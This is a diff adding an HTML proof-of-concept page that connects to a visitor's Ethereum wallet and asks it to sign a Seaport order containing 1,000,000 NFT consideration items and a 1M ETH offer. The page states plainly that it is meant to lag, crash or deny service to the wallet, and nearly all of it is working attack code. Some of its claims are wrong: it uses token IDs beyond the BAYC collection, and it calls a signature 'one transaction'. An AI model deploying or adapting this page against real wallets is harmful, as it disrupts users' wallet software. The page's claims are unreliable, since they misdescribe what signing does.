@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Seaport Multiple NFT Purchase PoC</title>
+  <style>
+    body { background: #111; color: #eee; font-family: system-ui; padding: 32px; text-align: center; }
+    .card { background: #0f1720; border-radius: 12px; padding: 20px; max-width: 900px; margin: 0 auto; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
+    h1 { color: #22c55e; }
+    button { padding: 16px 32px; font-size: 18px; background: #f6851b; color: white; border: none; border-radius: 12px; cursor: pointer; margin-top: 20px; }
+    pre { background: #071021; padding: 12px; border-radius: 8px; color: #e6eef8; text-align: left; max-height: 360px; overflow: auto; }
+    .warn { color: #ffcc00; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Seaport Multiple NFT Purchase PoC</h1>
+    <p>Click button to sign order buying 1,000,000 different NFTs in ONE transaction.</p>
+    <p class="warn">Warning: This will create a HUGE payload (1M items) → potential wallet lag/DoS or crash.</p>
+    <button onclick="buyMultipleNFTs()">Buy 1M NFTs Bundle</button>
+    <pre id="output">Ready...</pre>
+  </div>
+
+  <script>
+    const outEl = document.getElementById('output');
+
+    async function buyMultipleNFTs() {
+      if (!window.ethereum) {
+        outEl.textContent = "No wallet detected!";
+        return;
+      }
+
+      try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        const from = accounts[0];
+        outEl.textContent = `Connected: ${from}\nPreparing bundle order for 1,000,000 NFTs...`;
+
+        // Multiple consideration items (1,000,000 different NFTs)
+        const consideration = [];
+        for (let i = 1; i <= 1000000; i++) {
+          consideration.push({
+            itemType: 2, // ERC721
+            token: "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC contract (example)
+            identifierOrCriteria: i.toString(), // tokenId 1-1,000,000
+            startAmount: "1",
+            endAmount: "1",
+            recipient: from
+          });
+        }
+
+        const typedData = {
+          types: {
+            EIP712Domain: [
+              { name: "name", type: "string" },
+              { name: "version", type: "string" },
+              { name: "chainId", type: "uint256" },
+              { name: "verifyingContract", type: "address" }
+            ],
+            OrderComponents: [
+              { name: "offerer", type: "address" },
+              { name: "zone", type: "address" },
+              { name: "offer", type: "OfferItem[]" },
+              { name: "consideration", type: "ConsiderationItem[]" },
+              { name: "orderType", type: "uint8" },
+              { name: "startTime", type: "uint256" },
+              { name: "endTime", type: "uint256" },
+              { name: "zoneHash", type: "bytes32" },
+              { name: "salt", type: "uint256" },
+              { name: "conduitKey", type: "bytes32" },
+              { name: "counter", type: "uint256" }
+            ],
+            OfferItem: [
+              { name: "itemType", type: "uint8" },
+              { name: "token", type: "address" },
+              { name: "identifierOrCriteria", type: "uint256" },
+              { name: "startAmount", type: "uint256" },
+              { name: "endAmount", type: "uint256" }
+            ],
+            ConsiderationItem: [
+              { name: "itemType", type: "uint8" },
+              { name: "token", type: "address" },
+              { name: "identifierOrCriteria", type: "uint256" },
+              { name: "startAmount", type: "uint256" },
+              { name: "endAmount", type: "uint256" },
+              { name: "recipient", type: "address" }
+            ]
+          },
+          domain: {
+            name: "Seaport",
+            version: "1.5",
+            chainId: 1,
+            verifyingContract: "0x00000000000000adc04c56bf30ac9d3c0aaac8d8"
+          },
+          primaryType: "OrderComponents",
+          message: {
+            offerer: from,
+            zone: "0x004c00500000ad104d7cddbc9ff9e8d6f9a3b6d8",
+            offer: [{
+              itemType: 0, // ETH
+              token: "0x0000000000000000000000000000000000000000",
+              identifierOrCriteria: "0",
+              startAmount: "1000000000000000000000000", // 1M ETH (example)
+              endAmount: "1000000000000000000000000"
+            }],
+            consideration: consideration,
+            orderType: 0,
+            startTime: Math.floor(Date.now() / 1000),
+            endTime: Math.floor(Date.now() / 1000) + 86400,
+            zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+            salt: Math.floor(Math.random() * 1000000).toString(),
+            conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+            counter: 0
+          }
+        };
+
+        const sig = await ethereum.request({
+          method: "eth_signTypedData_v4",
+          params: [from, JSON.stringify(typedData)]
+        });
+
+        outEl.textContent += `\n\nSUCCESS! Signature: ${sig.substring(0, 20)}...`;
+        outEl.textContent += `\nBundle order for 1,000,000 NFTs signed in one transaction!`;
+
+      } catch (err) {
+        outEl.textContent += `\nERROR: ${err.message || err}`;
+      }
+    }
+  </script>
+</body>
+</html>
